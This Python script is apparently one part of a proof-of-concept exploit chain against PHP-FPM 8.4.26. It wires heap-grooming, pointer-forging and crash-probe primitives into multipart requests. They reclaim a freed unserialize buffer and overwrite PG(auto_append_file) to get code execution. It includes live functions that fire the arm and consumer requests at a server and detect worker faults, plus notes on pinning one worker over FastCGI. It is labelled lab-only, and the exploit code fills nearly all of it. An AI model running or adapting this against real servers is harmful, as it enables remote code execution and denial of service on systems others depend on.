#!/usr/bin/env python3
# INDEX: wire d-reclaim size-class + forge + consumer body + fire oracle | fpm | lab-only, offset-free reclaim
"""Composition harness for the sink-free FPM auto_append (.bss) finisher's
d-reclaim step: it wires the already-built primitives into one request plan and
proves the pieces compose coherently.

Pipeline wired here (each leg is an existing, separately-verified primitive):
  size   geometry/pud_reclaim_class  -> the carrier value length (1-page `out`)
  forge  write/bss_last_dtor_forge   -> carrier bytes (forged d header, .bss
                                        last_dtor), consumes a leaked binbase +
                                        carrier base + the per-build .bss offsets
  probe  write/last_dtor_forge       -> a leak-free magic-last_dtor carrier whose
                                        only job is the reclaim-landing signal
  body   groom/upload_progress_seed  -> the file part that drives the consumer
                                        decode of the stale BG(unserialize).data
  oracle oracles/auto_include_fire_oracle -> plain-GET marker = write landed

Offset-free reclaim model (why no a_off is read): every regular multipart field
value flows through multipart_buffer_read_body's `out` (erealloc, byte-0
aligned), which is freed per field, so the carrier's `out` lands on the LOWEST
free 1-page hole. By request-allocation determinism that hole is where the freed
`d` sat in the producer -- the carrier reclaims `d` by ordering, not by a
measured address (this is the mechanism proc_seeded_rce's gdb-confirmed groom
relies on; it reads a_off only as a safety check). The exact landing is
FOOTPRINT-SENSITIVE: the carrier's first-fit shifts with the multipart boundary
length / field count (see the d-preserving-groom finding), so `prefill_count`
and the boundary are the tuning knobs that align the consumer's pre-groom
footprint to the producer's. The offset-free land is a calibration/sweep, not an
address read.

`--plan` runs the full offline composition check (no network): sizes, forge
landing arithmetic, body well-formedness, oracle target -- all asserted.
`--probe` runs a bounded live reclaim-landing check on an authorized lab.

Lab/analysis use only, on systems you own or are authorized to test. stdlib only;
python3 -I safe.
"""
from __future__ import annotations

import argparse
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

from common import multipart as MP  # noqa: E402
from common.session_ids import SID_B  # noqa: E402
from primitives.geometry import pud_reclaim_class as RC  # noqa: E402
from primitives.write.bss_last_dtor_forge import forge_bss_autoappend  # noqa: E402
from primitives.write.last_dtor_forge import forge_last_dtor_value  # noqa: E402

MAGIC_LAST_DTOR = 0x5151515151515151   # unmapped canonical; deref -> worker fault

# --- cw 8.4.26-fpm ground truth (gdb-calibrated, fork-shared across workers) ---
# d (= BG(unserialize).data, the reclaim target) sits at chunk_base + a_off;
# a_off = 0x69000 (== offsets table), confirmed live at var_tmp_var on 6/6
# workers. binbase (php-fpm ELF) is fork-inherited, identical in every worker,
# so ONE /proc-maps or debugger read calibrates the whole pool -- the forge's
# absolute addresses (binbase, carrier_base=chunk+a_off) are a one-shot read, not
# a per-worker fact. DELIVERY: nginx round-robin scatters the arm and consumer
# across workers; pin one worker by speaking FastCGI directly to :9000 over a
# single connection with FCGI_KEEP_CONN so the arm and the reusing consumer land
# on the SAME worker (the live blocker observed here was scatter + the consumer
# decode taking a fresh d, NOT the size-class law).


def carrier_len():
    """Carrier value length: a 1-page `out` that reclaims d's first page."""
    return RC.PROVEN_VALUE_LEN         # 4071


def resolve_bss_offsets(off):
    """Fill error_prepend_off / input_encoding_off from core_globals_off if the
    loaded table carries only the base (8.4.26-fpm style)."""
    cg = off.get("core_globals_off") or off.get("core_globals")
    out = dict(off)
    out.setdefault("error_prepend_off", cg + 0x98)
    out.setdefault("input_encoding_off", cg + 0xb0)
    if "auto_append_off" not in out:
        out["auto_append_off"] = cg + 0xa8
    return out


def build_forge_carrier(off, binbase, carrier_base, include_ptr):
    """The real finisher carrier: forged d header pointing last_dtor at the .bss
    error_prepend slot so the decode deposits `include_ptr` at PG(auto_append)."""
    off = resolve_bss_offsets(off)
    return forge_bss_autoappend(carrier_len(), carrier_base, binbase, off,
                                include_ptr)


def build_probe_carrier():
    """Leak-free reclaim-landing carrier: magic last_dtor. If the carrier `out`
    reclaims d, the stale decode walks the forged bookkeeping and faults; if it
    does not land, the worker survives. No binbase / a_off / offsets needed."""
    val = bytearray(forge_last_dtor_value(carrier_len(), None, verbose=False))
    # forge_last_dtor_value(None) already plants MAGIC at d->last_dtor (+0x10).
    # Also point d->last (+0) at MAGIC so var_push faults even before tmp_var.
    val[0:8] = MAGIC_LAST_DTOR.to_bytes(8, "little")
    return bytes(val)


def prefill_value(idx):
    """A page-run field value (its live $_POST copy is a 1-page alloc): the
    footprint-tuning knob. Distinct first bytes keep each copy identifiable."""
    body = bytearray(b"Q" * carrier_len())
    tag = f"PRE{idx:04d}".encode()
    body[:len(tag)] = tag
    return bytes(body)


def build_consumer(carrier_bytes, prefill_count=0, sid=SID_B,
                   boundary=b"----P2Swire", file_field=b"victim"):
    """Assemble the consumer multipart body:
        PHPSESSID, PHP_SESSION_UPLOAD_PROGRESS, [prefill_count page-run fields],
        carrier field, file part (drives the upload-progress decode).
    Returns (body_bytes, content_type_header_value)."""
    specs = [(b"PHPSESSID", sid), (MP.PROGRESS_KEY, b"k")]
    for i in range(prefill_count):
        specs.append((f"pre{i}".encode(), prefill_value(i)))
    specs.append((b"g0", carrier_bytes))                      # the reclaim carrier
    specs.append((file_field, b"D" * 32, "victim.bin", "application/octet-stream"))
    return MP.multipart(specs, boundary=boundary)


# ----------------------------------------------------------------------------
# offline composition proof
# ----------------------------------------------------------------------------
def _check(name, cond, ok_acc):
    print(("  ok   " if cond else "  FAIL ") + name)
    ok_acc[0] &= bool(cond)
    return cond


def plan_check():
    """Prove every leg composes, offline. Uses representative 8.4.26-fpm (cw)
    constants for the forge arithmetic; no network, nothing fired."""
    ok = [True]
    print("[plan] === size leg (pud_reclaim_class) ===")
    L = carrier_len()
    _check(f"carrier len {L} is a viable page-run `out`", RC.carrier_is_viable(L), ok)
    _check(f"carrier `out` is exactly 1 page", RC.carrier_pages(L) == 1, ok)
    _check("d is a 3-page large run (reclaim target span)", RC.pud_pages() == 3, ok)

    print("[plan] === forge leg (bss_last_dtor_forge) ===")
    # representative cw-8.4.26-fpm .bss layout (matches the module selftest).
    off = {"core_globals_off": 0x16e1580}
    binbase = 0x5c1f11e00000
    carrier_base = 0x7f3a4ec00000 + 0x69000          # == chunk + a_off (cw table)
    include_ptr = carrier_base + 0x1800
    cbytes, info = build_forge_carrier(off, binbase, carrier_base, include_ptr)
    roff = resolve_bss_offsets(off)
    _check(f"forge carrier length == {L}", len(cbytes) == L, ok)
    _check("forged write dest == PG(auto_append_file)",
           info["dest"] == binbase + roff["auto_append_off"], ok)
    nz = [i for i, b in enumerate(cbytes) if b != ord("C")]
    _check(f"forge footprint {max(nz):#x} within carrier page 0",
           max(nz) < RC.ZEND_MM_PAGE_SIZE, ok)

    print("[plan] === probe leg (leak-free magic carrier) ===")
    pbytes = build_probe_carrier()
    _check(f"probe carrier length == {L}", len(pbytes) == L, ok)
    _check("probe d->last_dtor == MAGIC", pbytes[16:24] == MAGIC_LAST_DTOR.to_bytes(8, "little"), ok)
    _check("probe d->last == MAGIC", pbytes[0:8] == MAGIC_LAST_DTOR.to_bytes(8, "little"), ok)

    print("[plan] === body leg (consumer assembly) ===")
    body, ctype = build_consumer(cbytes, prefill_count=3)
    bnd = b"----P2Swire"
    nparts = body.count(b"--" + bnd + b"\r\nContent-Disposition")
    _check("content-type carries the boundary", bnd.decode() in ctype, ok)
    _check("body has PHPSESSID + progress + 3 prefill + carrier + file = 7 parts",
           nparts == 7, ok)
    _check("body is boundary-terminated", body.rstrip().endswith(b"--" + bnd + b"--"), ok)
    _check("carrier bytes present verbatim in the body", cbytes in body, ok)
    _check("file part drives the decode (filename present)", b'filename="victim.bin"' in body, ok)

    print("[plan] === oracle leg (auto_include_fire_oracle) ===")
    try:
        from primitives.oracles import auto_include_fire_oracle as O
        _check("oracle exposes plain_probe/oracle_fired", hasattr(O, "plain_probe") and hasattr(O, "oracle_fired"), ok)
        _check("oracle marker defined", bool(O.MARK_S), ok)
    except Exception as e:                            # pragma: no cover
        _check(f"oracle import ({e})", False, ok)

    print(f"\n==== plan_check: {'PASS' if ok[0] else 'FAIL'} ====")
    print("[plan] wired: size -> forge/probe -> consumer body -> fire oracle. "
          "Reclaim PLACEMENT (size-class carrier -> d) is validated by "
          "proc_seeded_rce's gdb-confirmed landing on this version/lab; the "
          "offset-free LIVE landing is footprint-sensitive (boundary length, "
          "field count, prefill -- see d-preserving-groom) and needs the "
          "auto_append fire oracle (leaked binbase) or gdb to confirm, not the "
          "blunt magic-crash probe whose negative is ambiguous.")
    return 0 if ok[0] else 1


# ----------------------------------------------------------------------------
# bounded live reclaim-landing probe (authorized lab)
# ----------------------------------------------------------------------------
def probe_live(host, port, arm_fn=None, prefill=0, sid=SID_B, verbose=True):
    """One bounded live check: (optional external arm) -> consumer with the
    leak-free magic carrier -> worker-liveness read. A worker fault after the
    consumer is the offset-free reclaim-landing signal. Returns a dict."""
    from common.http_urllib import http, worker_alive
    base = f"http://{host}:{port}"
    carrier = build_probe_carrier()
    body, ctype = build_consumer(carrier, prefill_count=prefill, sid=sid)
    hdrs = {"Content-Type": ctype, "Content-Length": str(len(body))}
    alive_before = worker_alive(base)
    try:
        st, rb = http(f"{base}/r2g.php", data=body, headers=hdrs, timeout=30)
        consumer_status = st
    except Exception as e:
        consumer_status = f"exc:{e}"
    alive_after = worker_alive(base)
    landed = (alive_before and not alive_after)
    if verbose:
        print(f"[probe] prefill={prefill} consumer->{consumer_status} "
              f"alive_before={alive_before} alive_after={alive_after} "
              f"-> reclaim-landing signal={'LANDED(fault)' if landed else 'no-fault'}")
    return {"prefill": prefill, "consumer_status": consumer_status,
            "alive_before": alive_before, "alive_after": alive_after,
            "landed_signal": landed}


def armed_probe(host, port, carrier_kind="page", sid=SID_B, verbose=True):
    """Full pure-HTTP sequence on the cw-style lab, no /proc, no a_off:
      seed session B -> build+fire the unser.php decode-OOM arm -> consumer POST
      with the chosen carrier (NOTHING between arm and consumer). Reports the
      worker-liveness differential. carrier_kind: 'page' (4071-byte page-run
      `out`, can reclaim d), 'small' (100-byte small-bin `out`, cannot), 'none'
      (no carrier field)."""
    from common.http_urllib import http, worker_alive
    base = f"http://{host}:{port}"
    magic = MAGIC_LAST_DTOR.to_bytes(8, "little")
    if carrier_kind == "page":
        carrier = build_probe_carrier()                       # 4071 page-run
    elif carrier_kind == "small":
        v = bytearray(b"G" * 100); v[0:8] = magic; v[16:24] = magic
        carrier = bytes(v)                                    # small-bin out
    else:
        carrier = None
    specs = [(b"PHPSESSID", sid), (MP.PROGRESS_KEY, b"k")]
    if carrier is not None:
        specs.append((b"g0", carrier))
    specs.append((b"victim", b"D" * 32, "victim.bin", "application/octet-stream"))
    body, ctype = MP.multipart(specs, boundary=b"----P2Swire")
    hdrs = {"Content-Type": ctype, "Content-Length": str(len(body))}

    http(f"{base}/sess.php?shape=w&sid={sid}", timeout=20)     # W2 seed session B
    http(f"{base}/unser.php?shape=dup&check", timeout=30)      # W1 build payload
    alive_pre = worker_alive(base)
    http(f"{base}/unser.php?shape=dup", timeout=60)            # R1' arm (OOM)
    try:
        st, rb = http(f"{base}/r2g.php", data=body, headers=hdrs, timeout=30)  # R2'
        cstat = st
    except Exception as e:
        cstat = f"exc:{e}"
    alive_post = worker_alive(base)
    landed = alive_pre and not alive_post
    if verbose:
        print(f"[armed/{carrier_kind:5s}] consumer->{cstat} alive_pre={alive_pre} "
              f"alive_post={alive_post} -> {'LANDED(fault)' if landed else 'no-fault'}")
    return {"kind": carrier_kind, "consumer_status": cstat,
            "alive_pre": alive_pre, "alive_post": alive_post, "landed": landed}


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("plan", help="offline composition proof (no network)")
    p = sub.add_parser("probe", help="bounded live reclaim-landing probe")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8151)
    p.add_argument("--prefill", type=int, default=0)
    p.add_argument("--sweep", type=int, default=0,
                   help="if >0, probe prefill in [0, sweep) and report each")
    a = ap.parse_args(argv)
    if a.cmd == "plan":
        return plan_check()
    if a.cmd == "probe":
        if a.sweep > 0:
            res = [probe_live(a.host, a.port, prefill=n) for n in range(a.sweep)]
            hit = [r for r in res if r["landed_signal"]]
            print(f"\n[probe] sweep done; landing signal at prefill="
                  f"{[r['prefill'] for r in hit] or 'none'}")
            return 0 if hit else 1
        r = probe_live(a.host, a.port, prefill=a.prefill)
        return 0 if r["landed_signal"] else 1
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
